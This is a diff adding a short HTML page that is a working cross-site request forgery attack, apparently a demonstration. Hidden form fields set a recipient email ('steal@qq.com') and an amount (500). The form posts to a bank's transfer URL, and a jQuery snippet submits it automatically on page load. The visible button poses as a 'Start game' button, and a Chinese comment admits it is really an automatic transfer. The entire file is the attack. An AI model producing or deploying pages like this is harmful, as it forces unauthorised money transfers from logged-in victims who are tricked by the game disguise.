@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>lalala </title>
+    <script src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+
+</head>
+<body>
+<form action="http://icbc.com/transfer/" method="post" id="myform">
+
+
+     <table>
+        <tbody>
+            <tr>
+                <td></td>
+                <td><input type="hidden" name="email" value="steal@qq.com"></td>
+            </tr>
+            <tr>
+                <td></td>
+                <td><input type="hidden" name="money" value="500"></td>
+            </tr>
+            <tr>
+                <td></td>
+                <td><input type="submit"  value="开始游戏"></td>
+            </tr>
+        </tbody>
+    </table>
+
+</form>
+<script>
+    //这段js代码是自动执行按开始游戏(其实就是自动转账)这个按钮
+    $(function () {
+        $("#myform").submit();
+
+    })
+</script>
+</body>
+</html>
